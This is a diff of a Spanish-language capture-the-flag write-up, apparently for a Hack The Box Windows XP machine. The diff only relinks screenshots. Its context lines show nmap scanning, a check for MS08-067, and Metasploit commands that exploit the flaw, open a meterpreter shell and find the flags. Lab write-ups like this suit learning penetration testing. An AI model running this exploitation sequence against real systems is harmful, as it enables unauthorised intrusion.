@@ -8,7 +8,7 @@ relizamos un escaneo basico de puertos con nmap
 ```bash
 nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.129.241.19 -oN scanner
 ```
-![[ 20250708095741.png]]
+![[ 20250708095741.png]](legacy-images/20250708095741.png)
 
 Una vez identificados los puertos abiertos procedemos a lanzar scripts básicos para ver el servicio y la versión que corren por detras
 
@@ -16,13 +16,13 @@ Una vez identificados los puertos abiertos procedemos a lanzar scripts básicos 
 nmap -p135,139.445 -sCV 10.129.241.19 -oN targeted
 ```
 
-![[ 20250708095923.png]]
+![[ 20250708095923.png]](legacy-images/20250708095923.png)
 
 # Autorecon
 
 Vamos a utilizar la herramienta autorecon a ver si conseguimos sacar algún dato extra que nos ayude a saber por donde debemos atacar
 
-![[ 20250708100741.png]]
+![[ 20250708100741.png]](legacy-images/20250708100741.png)
 
 aqui podemos ver que la maquina utiliza un windows XP del 2000-2008 PocketPC/CE tratemos de buscar vulnerabilidades es este tipo de sistemas
 
@@ -33,7 +33,7 @@ usando nmap podemos filtrar vulnerabilidades primero hay que ver si la vulnerabi
 ```bash
 ls /usr/share/nmap/scripts/ | grep smb
 ```
-![[ 20250708101928.png]]
+![[ 20250708101928.png]](legacy-images/20250708101928.png)
 
 podemos comprobar que si que esta la vulnerabilidad asi que usamos nmap para confirmarlo
 
@@ -41,7 +41,7 @@ podemos comprobar que si que esta la vulnerabilidad asi que usamos nmap para con
 nmap -p445 10.129.227.181 --script smb-vuln-ms08-067 -sV
 ```
 
-![[ 20250708102045.png]]
+![[ 20250708102045.png]](legacy-images/20250708102045.png)
 
 vemos que nmap termina de confirmar nuestras sospechas
 
@@ -59,7 +59,7 @@ buscamos exploits con la vulnerabilidad y vemos que si que existe uno
 search ms08-067
 ```
 
-![[ 20250708102247.png]]
+![[ 20250708102247.png]](legacy-images/20250708102247.png)
 
 ```bash
 use 0
@@ -75,17 +75,17 @@ set rhosts <IP Victima>
 exploit
 ```
 
-![[ 20250708102611.png]]
+![[ 20250708102611.png]](legacy-images/20250708102611.png)
 
 vemos que el exploit es un exito y nos devuelve una shell como meterpreter
 
 vemos que en el directorio `C:\Documents and Settings\Administrator\Desktop` se encuentra la flag de root
 
-![[ 20250708102844.png]]
+![[ 20250708102844.png]](legacy-images/20250708102844.png)
 
 y la flag de user esta en el directorio `C:\Documents and Settings\john\Desktop `
 
-![[ 20250708102935.png]]
+![[ 20250708102935.png]](legacy-images/20250708102935.png)
 
 # flags
 
